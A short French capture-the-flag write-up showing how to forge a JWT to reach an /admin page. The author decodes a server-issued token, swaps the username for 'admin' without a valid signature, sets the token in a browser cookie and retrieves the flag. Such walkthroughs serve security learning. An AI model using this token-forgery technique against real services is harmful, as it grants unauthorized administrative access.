# Write-up

Créer un JWT avec le pseudo de la persone : `{"pseudo": "drachh"}`. On reçoit la réponse du serveur avec le token signé.

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRyYWNoaCIsImV4cCI6MTc0MTY0MDgwNX0.iQ5h9h2CDbKq7R6a4XxUKr3cNJQ6BLrZtH7ulsqzdT0"
}
```

On peut utiliser un outil comme `jwt.io` pour décoder le token et voir la payload.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "username": "drachh",
  "exp": 1741640805
}
```

On remplace le `username` par `admin` et sans signer le token. On obtient le token suivant :

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQxNjQwODA1fQ.3b6LbAFqkRi57O1FpD6P3QHWUjbLJzfr6FveNaPHGqw
```

On modifie le token dans les cookies du navigateur et on visite la page `/admin` pour obtenir le flag.
